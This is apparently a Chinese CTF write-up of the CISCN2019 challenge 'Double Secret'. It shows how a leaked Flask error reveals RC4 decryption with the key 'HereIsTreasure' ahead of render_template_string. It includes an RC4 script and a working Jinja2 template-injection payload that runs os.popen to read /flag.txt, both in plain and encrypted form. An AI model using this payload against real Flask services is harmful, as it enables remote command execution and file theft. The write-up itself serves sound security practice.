---
title: '[CISCN2019 华东南赛区]Double Secret'
date: 2024-06-18 19:12:30
tags: 
      - RC4加密
categories: 刷题笔记
---

### [CISCN2019 华东南赛区]Double Secret（RC4加密）

我们打开页面，同时要我们寻找secret，

这就很明显了吧，我们访问secret页面

![image-20240619210204964](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406192102112.png)

然后页面提示要我们输入secret的值，那不就是传参嘛，我们随便传一个值

<!--more-->

```
?secret=1
```

![image-20240619210303129](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406192103222.png)

我们传入1，页面却回显了d，说明页面对我们传入的内容进行了加密，我们尝试增加参数的长度

```
?secret=111111111111111111
```

![image-20240619210417663](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406192104835.png)

得到报错信息，源码直接泄露了

![image-20240619210450719](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406192104830.png)

```
 if(secret==None):
        return 'Tell me your secret.I will encrypt it so others can\'t see'
    rc=rc4_Modified.RC4("HereIsTreasure")   #解密
    deS=rc.do_crypt(secret)
 
    a=render_template_string(safe(deS))
 
    if 'ciscn' in a.lower():
        return 'flag detected!'
    return a
```

我们对代码进行审计，如果secret是空，就会返回错误信息，如果传入了值，就会进行RC4解密，密钥是"HereIsTreasure"

所以我们需要对传入的secret进行RC4加密。我们了解到这是flask的模板，而且python的版本是2.7的，那么我们可以利用flask的模板注入，执行命令，只不过需要进行RC4加密。

加密脚本

```
# -*- coding: utf-8 -*-
import base64
 
def get_message():
	print("输入你的信息： ")
	s=input()
	return s
 
def get_key():
	print("输入你的密钥： ")
	key=input()
	if key=='':
		key="不要输入空的 key 值"
	return key
 
def init_box(key):
	"""
	S盒
	"""
	s_box=list(range(256))	#这里没管秘钥小于256的情况，小于256应该不断重复填充即可，这里完成了 C 实现中的 for(i=0;i<256;i++) prc4->s_box[i] = i;
	j=0
	for i in range(256):
		j=(j+s_box[i] + ord(key[i % len(key)])) % 256	#这里把 C 实现中的 prc4->t_box[i] = key[i % keylen];和j=(j+prc4->s_box[i]+prc4->t_box[i])%256;合并在了一起。
		s_box[i],s_box[j] = s_box[j],s_box[i]
	#print(type(s_box)) #可以输出 s_box 来看是否随机混乱的
	return s_box
 
def ex_encrypt(plain,box,mode):
	"""
    利用PRGA生成秘钥流并与密文字节异或，加解密同一个算法
    """
	if mode == '2':
		while True:
			c_mode=input("输入你的解密模式：base64 or ordinary\n")
			if c_mode == 'base64':
				plain=base64.b64decode(plain)
				plain=bytes.decode(plain)				#因为返回的是解码过的  bytes，所以需要再用 decode 解码成字符串。
				break
			elif c_mode == 'ordinary':
				break
			else:
				print("输入不合法，请重新输入")
				continue
	
	res=[]
	i=j=0
	for s in plain:						
		i=(i+1)%256
		j=(j+box[i])%256
		box[i],box[j]=box[j],box[i]
		t=(box[i]+box[j]) % 256
		k=box[t]
		res.append(chr(ord(s)^k))
 
	cipher="".join(res)
    #print(cipher)
 
#根据选择进行输出，至于是明文还是密文得看用户决定
	if mode == '1':
        # 化成可视字符需要编码
		print("加密后的输出（没经过任何编码）")
		print(cipher)
        # base64的目的也是为了变成可见字符
		print("base64后的编码")
		print(str(base64.b64encode(cipher.encode('utf-8')),'utf-8'))
	if mode == '2':
		print("解密后的密文")
		print(cipher)
 
def get_mode():
	print("请选择加密或者解密")
	print("1.Encrypt")
	print("2.Decrypt")
 
	mode = input()
 
	if mode == '1':			#加密解密虽同源，但是由于不能直接用 =='1' or '2'，所以还是得分开写
		message = get_message()
		key = get_key()
		box = init_box(key)
		ex_encrypt(message,box,mode)
	elif mode == '2':			#由于异或运算的对合性，RC4加密解密使用同一套算法。
		message = get_message()
		key = get_key()
		box = init_box(key)
		ex_encrypt(message,box,mode)
	else:
		print("输入有误！ ")
 
if __name__ == '__main__':
	while True:
		get_mode()
```

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")}}{% endif %}{% endfor %}


//.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96


```

得到flag

![image-20240619211822617](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406192118690.png)
